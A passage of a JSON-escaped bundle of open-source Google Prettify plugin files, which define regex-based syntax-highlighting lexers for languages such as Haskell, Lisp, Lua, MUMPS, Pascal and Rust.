/^(?:cache|database_names|database_schemanames|database_tablenames|define_tag|define_type|email_batch|encode_set|html_comment|handle|handle_error|header|if|inline|iterate|ljax_target|link|link_currentaction|link_currentgroup|link_currentrecord|link_detail|link_firstgroup|link_firstrecord|link_lastgroup|link_lastrecord|link_nextgroup|link_nextrecord|link_prevgroup|link_prevrecord|log|loop|namespace_using|output_none|portal|private|protect|records|referer|referrer|repeating|resultset|rows|search_args|search_arguments|select|sort_args|sort_arguments|thread_atomic|value_list|while|abort|case|else|fail_if|fail_ifnot|fail|if_empty|if_false|if_null|if_true|loop_abort|loop_continue|loop_count|params|params_up|return|return_value|run_children|soap_definetag|soap_lastrequest|soap_lastresponse|tag_name|ascending|average|by|define|descending|do|equals|frozen|group|handle_failure|import|in|into|join|let|match|max|min|on|order|parent|protected|provide|public|require|returnhome|skip|split_thread|sum|take|thread|to|trait|type|where|with|yield|yieldhome)\\b/i], // type, method, or parameter names [PR['PR_PLAIN'], /^[a-z_][\\w.]*(?:=\\s*(?=\\())?/i], // operators [PR['PR_PUNCTUATION'], /^:=|[-+*\\/%=&|!?\\\\]+/] ]), ['lasso', 'ls', 'lassoscript']);","path":"plugins/prettify/lang-lasso.js"},{"title":"","text":"/** * @license * Copyright (C) 2009 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Haskell. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my lisp code) * The lang-cl class identifies the language as common lisp. * This file supports the following language extensions: * lang-cl - Common Lisp * lang-el - Emacs Lisp * lang-lisp - Lisp * lang-scm - Scheme * * * I used http://www.informatik.uni-freiburg.de/~thiemann/haskell/haskell98-report-html/syntax-iso.html * as the basis, but ignore the way the ncomment production nests since this * makes the lexical grammar irregular. It might be possible to support * ncomments using the lookbehind filter. * * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace // whitechar -> newline | vertab | space | tab | uniWhite // newline -> return linefeed | return | linefeed | formfeed [PR['PR_PLAIN'], /^[\\t\\n\\x0B\\x0C\\r ]+/, null, '\\t\\n\\x0B\\x0C\\r '], // Single line double and single-quoted strings. // char -> ' (graphic \" {graphic \\ ( charesc | ascii | decimal | o octal // | x hexadecimal ) // charesc -> a | b | f | n | r | t | v | \\ | \" | ' | & [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\\\n\\x0C\\r]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'], [PR['PR_STRING'], /^\\'(?:[^\\'\\\\\\n\\x0C\\r]|\\\\[^&])\\'?/, null, \"'\"], // decimal -> digit{digit} // octal -> octit{octit} // hexadecimal -> hexit{hexit} // integer -> decimal // | 0o octal | 0O octal // | 0x hexadecimal | 0X hexadecimal // float -> decimal . decimal [exponent] // | decimal exponent // exponent -> (e | E) [+ | -] decimal [PR['PR_LITERAL'], /^(?:0o[0-7]+|0x[\\da-f]+|\\d+(?:\\.\\d+)?(?:e[+\\-]?\\d+)?)/i, null, '0123456789'] ], [ // Haskell does not have a regular lexical grammar due to the nested // ncomment. // comment -> dashes [ any {any}] newline // ncomment -> opencom ANYseq {ncomment ANYseq}closecom // dashes -> '--' {'-'} // opencom -> '{-' // closecom -> '-}' [PR['PR_COMMENT'], /^(?:(?:--+(?:[^\\r\\n\\x0C]*)?)|(?:\\{-(?:[^-]|-+[^-\\}])*-\\}))/], // reservedid -> case | class | data | default | deriving | do // | else | if | import | in | infix | infixl | infixr // | instance | let | module | newtype | of | then // | type | where | _ [PR['PR_KEYWORD'], /^(?:case|class|data|default|deriving|do|else|if|import|in|infix|infixl|infixr|instance|let|module|newtype|of|then|type|where|_)(?=[^a-zA-Z0-9\\']|$)/, null], // qvarid -> [ modid . ] varid // qconid -> [ modid . ] conid // varid -> (small {small | large | digit | ' }) // conid -> large {small | large | digit | ' } // modid -> conid // small -> ascSmall | uniSmall | _ // ascSmall -> a | b | ... | z // uniSmall -> any Unicode lowercase letter // large -> ascLarge | uniLarge // ascLarge -> A | B | ... | Z // uniLarge -> any uppercase or titlecase Unicode letter [PR['PR_PLAIN'], /^(?:[A-Z][\\w\\']*\\.)*[a-zA-Z][\\w\\']*/], // matches the symbol production [PR['PR_PUNCTUATION'], /^[^\\t\\n\\x0B\\x0C\\r a-zA-Z0-9\\'\\\"]+/] ]), ['hs']);","path":"plugins/prettify/lang-hs.js"},{"title":"","text":"/** * @license * Copyright (C) 2008 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Common Lisp and related languages. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my lisp code) * The lang-cl class identifies the language as common lisp. * This file supports the following language extensions: * lang-cl - Common Lisp * lang-el - Emacs Lisp * lang-lisp - Lisp * lang-scm - Scheme * lang-lsp - FAT 8.3 filename version of lang-lisp. * * * I used http://www.devincook.com/goldparser/doc/meta-language/grammar-LISP.htm * as the basis, but added line comments that start with ; and changed the atom * production to disallow unquoted semicolons. * * \"Name\" = 'LISP' * \"Author\" = 'John McCarthy' * \"Version\" = 'Minimal' * \"About\" = 'LISP is an abstract language that organizes ALL' * | 'data around \"lists\".' * * \"Start Symbol\" = [s-Expression] * * {Atom Char} = {Printable} - {Whitespace} - [()\"\\''] * * Atom = ( {Atom Char} | '\\'{Printable} )+ * * [s-Expression] ::= [Quote] Atom * | [Quote] '(' [Series] ')' * | [Quote] '(' [s-Expression] '.' [s-Expression] ')' * * [Series] ::= [s-Expression] [Series] * | * * [Quote] ::= '' !Quote = do not evaluate * | * * * I used Practical Common Lisp as * the basis for the reserved word list. * * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ ['opn', /^\\(+/, null, '('], ['clo', /^\\)+/, null, ')'], // A line comment that starts with ; [PR['PR_COMMENT'], /^;[^\\r\\n]*/, null, ';'], // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double quoted, possibly multi-line, string. [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'] ], [ [PR['PR_KEYWORD'], /^(?:block|c[ad]+r|catch|con[ds]|def(?:ine|un)|do|eq|eql|equal|equalp|eval-when|flet|format|go|if|labels|lambda|let|load-time-value|locally|macrolet|multiple-value-call|nil|progn|progv|quote|require|return-from|setq|symbol-macrolet|t|tagbody|the|throw|unwind)\\b/, null], [PR['PR_LITERAL'], /^[+\\-]?(?:[0#]x[0-9a-f]+|\\d+\\/\\d+|(?:\\.\\d+|\\d+(?:\\.\\d*)?)(?:[ed][+\\-]?\\d+)?)/i], // A single quote possibly followed by a word that optionally ends with // = ! or ?. [PR['PR_LITERAL'], /^\\'(?:-*(?:\\w|\\\\[\\x21-\\x7e])(?:[\\w-]*|\\\\[\\x21-\\x7e])[=!?]?)?/], // A word that optionally ends with = ! or ?. [PR['PR_PLAIN'], /^-*(?:[a-z_]|\\\\[\\x21-\\x7e])(?:[\\w-]*|\\\\[\\x21-\\x7e])[=!?]?/i], // A printable non-space non-special character [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\xA0()\\\"\\\\\\';]+/] ]), ['cl', 'el', 'lisp', 'lsp', 'scm', 'ss', 'rkt']);","path":"plugins/prettify/lang-lisp.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Nikhil Dabas * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for LLVM. * From https://gist.github.com/ndabas/2850418 * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my LLVM code) * * * The regular expressions were adapted from: * https://github.com/hansstimer/llvm.tmbundle/blob/76fedd8f50fd6108b1780c51d79fbe3223de5f34/Syntaxes/LLVM.tmLanguage * * http://llvm.org/docs/LangRef.html#constants describes the language grammar. * * @author Nikhil Dabas */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double quoted, possibly multi-line, string. [PR['PR_STRING'], /^!?\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'], // comment.llvm [PR['PR_COMMENT'], /^;[^\\r\\n]*/, null, ';'] ], [ // variable.llvm [PR['PR_PLAIN'], /^[%@!](?:[-a-zA-Z$._][-a-zA-Z$._0-9]*|\\d+)/], // According to http://llvm.org/docs/LangRef.html#well-formedness // These reserved words cannot conflict with variable names, because none of them start with a prefix character ('%' or '@'). [PR['PR_KEYWORD'], /^[A-Za-z_][0-9A-Za-z_]*/, null], // constant.numeric.float.llvm [PR['PR_LITERAL'], /^\\d+\\.\\d+/], // constant.numeric.integer.llvm [PR['PR_LITERAL'], /^(?:\\d+|0[xX][a-fA-F0-9]+)/], // punctuation [PR['PR_PUNCTUATION'], /^[()\\[\\]{},=*:]|\\.\\.\\.$/] ]), ['llvm', 'll']);","path":"plugins/prettify/lang-llvm.js"},{"title":"","text":"/** * @license * Copyright (C) 2008 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for OCaml, SML, F# and similar languages. * * Based on the lexical grammar at * http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/manual/spec.html#_Toc270597388 * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace is made up of spaces, tabs and newline characters. [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // #if ident/#else/#endif directives delimit conditional compilation // sections [PR['PR_COMMENT'], /^#(?:if[\\t\\n\\r \\xA0]+(?:[a-z_$][\\w\\']*|``[^\\r\\n\\t`]*(?:``|$))|else|endif|light)/i, null, '#'], // A double or single quoted, possibly multi-line, string. // F# allows escaped newlines in strings. [PR['PR_STRING'], /^(?:\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)|\\'(?:[^\\'\\\\]|\\\\[\\s\\S])(?:\\'|$))/, null, '\"\\''] ], [ // Block comments are delimited by (* and *) and may be // nested. Single-line comments begin with // and extend to // the end of a line. // TODO: (*...*) comments can be nested. This does not handle that. [PR['PR_COMMENT'], /^(?:\\/\\/[^\\r\\n]*|\\(\\*[\\s\\S]*?\\*\\))/], [PR['PR_KEYWORD'], /^(?:abstract|and|as|assert|begin|class|default|delegate|do|done|downcast|downto|elif|else|end|exception|extern|false|finally|for|fun|function|if|in|inherit|inline|interface|internal|lazy|let|match|member|module|mutable|namespace|new|null|of|open|or|override|private|public|rec|return|static|struct|then|to|true|try|type|upcast|use|val|void|when|while|with|yield|asr|land|lor|lsl|lsr|lxor|mod|sig|atomic|break|checked|component|const|constraint|constructor|continue|eager|event|external|fixed|functor|global|include|method|mixin|object|parallel|process|protected|pure|sealed|trait|virtual|volatile)\\b/], // A number is a hex integer literal, a decimal real literal, or in // scientific notation. [PR['PR_LITERAL'], /^[+\\-]?(?:0x[\\da-f]+|(?:(?:\\.\\d+|\\d+(?:\\.\\d*)?)(?:e[+\\-]?\\d+)?))/i], [PR['PR_PLAIN'], /^(?:[a-z_][\\w']*[!?#]?|``[^\\r\\n\\t`]*(?:``|$))/i], // A printable non-space non-special character [PR['PR_PUNCTUATION'], /^[^\\t\\n\\r \\xA0\\\"\\'\\w]+/] ]), ['fs', 'ml']);","path":"plugins/prettify/lang-ml.js"},{"title":"","text":"/** * @license * Copyright (C) 2014 Paulo Moura * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Logtalk. * http://logtalk.org/ * @author Paulo Moura */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // double-quoted strings. [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\\\n\\x0C\\r]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'], // atoms (don't break on underscores!) [PR['PR_LITERAL'], /^[a-z][a-zA-Z0-9_]*/], // quoted atoms [PR['PR_LITERAL'], /^\\'(?:[^\\'\\\\\\n\\x0C\\r]|\\\\[^&])+\\'?/, null, \"'\"], // numbers [PR['PR_LITERAL'], /^(?:0'.|0b[0-1]+|0o[0-7]+|0x[\\da-f]+|\\d+(?:\\.\\d+)?(?:e[+\\-]?\\d+)?)/i, null, '0123456789'] ], [ // single-line comments begin with % [PR['PR_COMMENT'], /^%[^\\r\\n]*/, null, '%'], // block comments are delimited by /* and */ [PR['PR_COMMENT'], /^\\/\\*[\\s\\S]*?\\*\\//], // directives [PR['PR_KEYWORD'], /^\\s*:-\\s(c(a(lls|tegory)|oinductive)|p(ublic|r(ot(ocol|ected)|ivate))|e(l(if|se)|n(coding|sure_loaded)|xport)|i(f|n(clude|itialization|fo))|alias|d(ynamic|iscontiguous)|m(eta_(non_terminal|predicate)|od(e|ule)|ultifile)|reexport|s(et_(logtalk|prolog)_flag|ynchronized)|o(bject|p)|use(s|_module))/], [PR['PR_KEYWORD'], /^\\s*:-\\s(e(lse|nd(if|_(category|object|protocol)))|built_in|dynamic|synchronized|threaded)/], // variables [PR['PR_TYPE'], /^[A-Z_][a-zA-Z0-9_]*/], // operators [PR['PR_PUNCTUATION'], /^[.,;{}:^=\\\\/+*?#!-]/] ]), ['logtalk', 'lgt']);","path":"plugins/prettify/lang-logtalk.js"},{"title":"","text":"/** * @license * Copyright (C) 2008 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Lua. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my Lua code) * * * I used http://www.lua.org/manual/5.1/manual.html#2.1 * Because of the long-bracket concept used in strings and comments, Lua does * not have a regular lexical grammar, but luckily it fits within the space * of irregular grammars supported by javascript regular expressions. * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double or single quoted, possibly multi-line, string. [PR['PR_STRING'], /^(?:\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)|\\'(?:[^\\'\\\\]|\\\\[\\s\\S])*(?:\\'|$))/, null, '\"\\''] ], [ // A comment is either a line comment that starts with two dashes, or // two dashes preceding a long bracketed block. [PR['PR_COMMENT'], /^--(?:\\[(=*)\\[[\\s\\S]*?(?:\\]\\1\\]|$)|[^\\r\\n]*)/], // A long bracketed block not preceded by -- is a string. [PR['PR_STRING'], /^\\[(=*)\\[[\\s\\S]*?(?:\\]\\1\\]|$)/], [PR['PR_KEYWORD'], /^(?:and|break|do|else|elseif|end|false|for|function|if|in|local|nil|not|or|repeat|return|then|true|until|while)\\b/, null], // A number is a hex integer literal, a decimal real literal, or in // scientific notation. [PR['PR_LITERAL'], /^[+-]?(?:0x[\\da-f]+|(?:(?:\\.\\d+|\\d+(?:\\.\\d*)?)(?:e[+\\-]?\\d+)?))/i], // An identifier [PR['PR_PLAIN'], /^[a-z_]\\w*/i], // A run of punctuation [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\xA0][^\\w\\t\\n\\r \\xA0\\\"\\'\\-\\+=]*/] ]), ['lua']);","path":"plugins/prettify/lang-lua.js"},{"title":"","text":"/** * @license * Copyright (C) 2011 Zimin A.V. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for the Nemerle language. * http://nemerle.org * @author Zimin A.V. */ (function () { // http://nemerle.org/wiki/index.php?title=Base_keywords var keywords = 'abstract|and|as|base|catch|class|def|delegate|enum|event|extern|false|finally|' + 'fun|implements|interface|internal|is|macro|match|matches|module|mutable|namespace|new|' + 'null|out|override|params|partial|private|protected|public|ref|sealed|static|struct|' + 'syntax|this|throw|true|try|type|typeof|using|variant|virtual|volatile|when|where|with|' + 'assert|assert2|async|break|checked|continue|do|else|ensures|for|foreach|if|late|lock|new|nolate|' + 'otherwise|regexp|repeat|requires|return|surroundwith|unchecked|unless|using|while|yield'; PR['registerLangHandler'](PR['createSimpleLexer']( // shortcutStylePatterns [ [PR['PR_STRING'], /^(?:\\'(?:[^\\\\\\'\\r\\n]|\\\\.)*\\'|\\\"(?:[^\\\\\\\"\\r\\n]|\\\\.)*(?:\\\"|$))/, null, '\"'], [PR['PR_COMMENT'], /^#(?:(?:define|elif|else|endif|error|ifdef|include|ifndef|line|pragma|undef|warning)\\b|[^\\r\\n]*)/, null, '#'], [PR['PR_PLAIN'], /^\\s+/, null, ' \\r\\n\\t\\xA0'] ], // fallthroughStylePatterns [ [PR['PR_STRING'], /^@\\\"(?:[^\\\"]|\\\"\\\")*(?:\\\"|$)/, null], [PR['PR_STRING'], /^])*(?:#>|$)/, null], [PR['PR_STRING'], /^/, null], [PR['PR_COMMENT'], /^\\/\\/[^\\r\\n]*/, null], [PR['PR_COMMENT'], /^\\/\\*[\\s\\S]*?(?:\\*\\/|$)/, null], [PR['PR_KEYWORD'], new RegExp('^(?:' + keywords + ')\\\\b'), null], [PR['PR_TYPE'], /^(?:array|bool|byte|char|decimal|double|float|int|list|long|object|sbyte|short|string|ulong|uint|ufloat|ulong|ushort|void)\\b/, null], [PR['PR_LITERAL'], /^@[a-z_$][a-z_$@0-9]*/i, null], [PR['PR_TYPE'], /^@[A-Z]+[a-z][A-Za-z_$@0-9]*/, null], [PR['PR_PLAIN'], /^'?[A-Za-z_$][a-z_$@0-9]*/i, null], [PR['PR_LITERAL'], new RegExp( '^(?:' // A hex number + '0x[a-f0-9]+' // or an octal or decimal number, + '|(?:\\\\d(?:_\\\\d+)*\\\\d*(?:\\\\.\\\\d*)?|\\\\.\\\\d\\\\+)' // possibly in scientific notation + '(?:e[+\\\\-]?\\\\d+)?' + ')' // with an optional modifier like UL for unsigned long + '[a-z]*', 'i'), null, '0123456789'], [PR['PR_PUNCTUATION'], /^.[^\\s\\w\\.$@\\'\\\"\\`\\/\\#]*/, null] ]), ['n', 'nemerle']); })();","path":"plugins/prettify/lang-n.js"},{"title":"","text":"/** * @license * Copyright (C) 2011 Kitware Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for MUMPS. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my SQL code) * * Commands, intrinsic functions and variables taken from ISO/IEC 11756:1999(E) * * @author chris.harris@kitware.com * * Known issues: * * - Currently can't distinguish between keywords and local or global variables having the same name * for exampe SET IF=\"IF?\" * - m file are already used for MatLab hence using mumps. */ (function () { var commands = 'B|BREAK|' + 'C|CLOSE|' + 'D|DO|' + 'E|ELSE|' + 'F|FOR|' + 'G|GOTO|' + 'H|HALT|' + 'H|HANG|' + 'I|IF|' + 'J|JOB|' + 'K|KILL|' + 'L|LOCK|' + 'M|MERGE|' + 'N|NEW|' + 'O|OPEN|' + 'Q|QUIT|' + 'R|READ|' + 'S|SET|' + 'TC|TCOMMIT|' + 'TRE|TRESTART|' + 'TRO|TROLLBACK|' + 'TS|TSTART|' + 'U|USE|' + 'V|VIEW|' + 'W|WRITE|' + 'X|XECUTE'; var intrinsicVariables = 'D|DEVICE|' + 'EC|ECODE|' + 'ES|ESTACK|' + 'ET|ETRAP|' + 'H|HOROLOG|' + 'I|IO|' + 'J|JOB|' + 'K|KEY|' + 'P|PRINCIPAL|' + 'Q|QUIT|' + 'ST|STACK|' + 'S|STORAGE|' + 'SY|SYSTEM|' + 'T|TEST|' + 'TL|TLEVEL|' + 'TR|TRESTART|' + 'X|' + 'Y|' + 'Z[A-Z]*|'; var intrinsicFunctions = 'A|ASCII|' + 'C|CHAR|' + 'D|DATA|' + 'E|EXTRACT|' + 'F|FIND|' + 'FN|FNUMBER|' + 'G|GET|' + 'J|JUSTIFY|' + 'L|LENGTH|' + 'NA|NAME|' + 'O|ORDER|' + 'P|PIECE|' + 'QL|QLENGTH|' + 'QS|QSUBSCRIPT|' + 'Q|QUERY|' + 'R|RANDOM|' + 'RE|REVERSE|' + 'S|SELECT|' + 'ST|STACK|' + 'T|TEXT|' + 'TR|TRANSLATE|' + 'V|VIEW|' * 'Z[A-Z]*|'; var intrinsic = intrinsicVariables + intrinsicFunctions; var shortcutStylePatterns = [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double or single quoted, possibly multi-line, string. [PR['PR_STRING'], /^(?:\"(?:[^\"]|\\\\.)*\")/, null, '\"'] ]; var fallthroughStylePatterns = [ // A line comment that starts with ; [PR['PR_COMMENT'], /^;[^\\r\\n]*/, null, ';'], // Add intrinsic variables and functions as declarations, there not really but it mean // they will hilighted differently from commands. [PR['PR_DECLARATION'], new RegExp('^(?:\\\\$(?:' + intrinsic + '))\\\\b', 'i'), null], // Add commands as keywords [PR['PR_KEYWORD'], new RegExp('^(?:[^\\\\$]' + commands + ')\\\\b', 'i'), null], // A number is a decimal real literal or in scientific notation. [PR['PR_LITERAL'], /^[+-]?(?:(?:\\.\\d+|\\d+(?:\\.\\d*)?)(?:E[+\\-]?\\d+)?)/i], // An identifier [PR['PR_PLAIN'], /^[a-z][a-zA-Z0-9]*/i], // Exclude $ % and ^ [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r\\xA0\\\"\\$;%\\^]|_/] ]; // Can't use m as its already used for MatLab PR.registerLangHandler(PR.createSimpleLexer(shortcutStylePatterns, fallthroughStylePatterns), ['mumps']); })();","path":"plugins/prettify/lang-mumps.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Peter Kofler * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ // Contributed by peter dot kofler at code minus cop dot org /** * @fileoverview * Registers a language handler for (Turbo) Pascal. * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my Pascal code) * * @author peter dot kofler at code minus cop dot org */ PR.registerLangHandler( PR.createSimpleLexer( [ // shortcutStylePatterns // 'single-line-string' [PR.PR_STRING, /^(?:\\'(?:[^\\\\\\'\\r\\n]|\\\\.)*(?:\\'|$))/, null, '\\''], // Whitespace [PR.PR_PLAIN, /^\\s+/, null, ' \\r\\n\\t\\xA0'] ], [ // fallthroughStylePatterns // A cStyleComments comment (* *) or {} [PR.PR_COMMENT, /^\\(\\*[\\s\\S]*?(?:\\*\\)|$)|^\\{[\\s\\S]*?(?:\\}|$)/, null], [PR.PR_KEYWORD, /^(?:ABSOLUTE|AND|ARRAY|ASM|ASSEMBLER|BEGIN|CASE|CONST|CONSTRUCTOR|DESTRUCTOR|DIV|DO|DOWNTO|ELSE|END|EXTERNAL|FOR|FORWARD|FUNCTION|GOTO|IF|IMPLEMENTATION|IN|INLINE|INTERFACE|INTERRUPT|LABEL|MOD|NOT|OBJECT|OF|OR|PACKED|PROCEDURE|PROGRAM|RECORD|REPEAT|SET|SHL|SHR|THEN|TO|TYPE|UNIT|UNTIL|USES|VAR|VIRTUAL|WHILE|WITH|XOR)\\b/i, null], [PR.PR_LITERAL, /^(?:true|false|self|nil)/i, null], [PR.PR_PLAIN, /^[a-z][a-z0-9]*/i, null], // Literals .0, 0, 0.0 0E13 [PR.PR_LITERAL, /^(?:\\$[a-f0-9]+|(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:e[+\\-]?\\d+)?)/i, null, '0123456789'], [PR.PR_PUNCTUATION, /^.[^\\s\\w\\.$@\\'\\/]*/, null] ]), ['pascal']);","path":"plugins/prettify/lang-pascal.js"},{"title":"","text":"/** * @license * Copyright (C) 2006 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Protocol Buffers as described at * http://code.google.com/p/protobuf/. * * Based on the lexical grammar at * http://research.microsoft.com/fsharp/manual/spec2.aspx#_Toc202383715 * * @author mikesamuel@gmail.com */ PR['registerLangHandler'](PR['sourceDecorator']({ 'keywords': ( 'bytes,default,double,enum,extend,extensions,false,' + 'group,import,max,message,option,' + 'optional,package,repeated,required,returns,rpc,service,' + 'syntax,to,true'), 'types': /^(bool|(double|s?fixed|[su]?int)(32|64)|float|string)\\b/, 'cStyleComments': true }), ['proto']);","path":"plugins/prettify/lang-proto.js"},{"title":"","text":"/** * @license * Copyright (C) 2012 Jeffrey Arnold * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Support for R documentation (Rd) files * * Minimal highlighting or Rd files, basically just highlighting * macros. It does not try to identify verbatim or R-like regions of * macros as that is too complicated for a lexer. Descriptions of the * Rd format can be found * http://cran.r-project.org/doc/manuals/R-exts.html and * http://developer.r-project.org/parseRd.pdf. * * @author Jeffrey Arnold */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // all comments begin with '%' [PR['PR_COMMENT'], /^%[^\\r\\n]*/, null, '%'] ], [// special macros with no args [PR['PR_LITERAL'], /^\\\\(?:cr|l?dots|R|tab)\\b/], // macros [PR['PR_KEYWORD'], /^\\\\[a-zA-Z@]+/], // highlighted as macros, since technically they are [PR['PR_KEYWORD'], /^#(?:ifn?def|endif)/ ], // catch escaped brackets [PR['PR_PLAIN'], /^\\\\[{}]/], // punctuation [PR['PR_PUNCTUATION'], /^[{}()\\[\\]]+/] ]), ['Rd', 'rd']);","path":"plugins/prettify/lang-rd.js"},{"title":"","text":"/** * @license * Copyright (C) 2015 Chris Morgan * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Rust. * * Derived from prior experience implementing similar things in a few environments, * most especially rust.vim. * * @author me@chrismorgan.info */ PR['registerLangHandler']( PR['createSimpleLexer']([], [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/], // Single line comments [PR['PR_COMMENT'], 